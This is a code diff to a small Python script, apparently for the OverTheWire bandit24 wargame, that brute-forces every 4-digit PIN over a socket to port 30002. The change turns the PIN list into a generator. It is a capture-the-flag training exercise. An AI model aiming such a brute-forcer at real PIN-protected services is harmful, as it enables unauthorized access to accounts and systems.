@@ -3,8 +3,8 @@
 '''
     unpin.py -- Simple 4-digit bruteforcer
 
-    overthewire.org 
-    bandit24 bruteforcer script
+    - overthewire.org
+    - bandit24 bruteforcer script
 
     Disclaimer:
         I am not liable for using this script to bruteforce online pins.
@@ -25,13 +25,16 @@ port = 30002
 def generate_pin():
 
     # Generate 10000 combinations of 0000-9999 in a list
+    # Updated for memory efficiency
 
-    pin = [''.join(map(str, i)) for i in itertools.product(range(10), repeat=4)]
+    for i in itertools.product(range(10), repeat=4):
 
-    return pin
+        pin = ''.join(map(str, i))
+
+        yield pin
 
 
-def send_data(host, port, passwd, pin_list):
+def send_data(host, port, passwd):
 
     # Send pieces of data to server
 
@@ -41,7 +44,9 @@ def send_data(host, port, passwd, pin_list):
 
     s.connect((host, port))
 
-    for pin in pin_list:
+    pins = generate_pin()
+
+    for pin in pins:
 
         pin = str(pin)
 
@@ -65,4 +70,4 @@ if __name__ == '__main__':
 
     pin_list = generate_pin()
 
-    send_data(host, port, passwd, pin_list)
+    send_data(host, port, passwd)
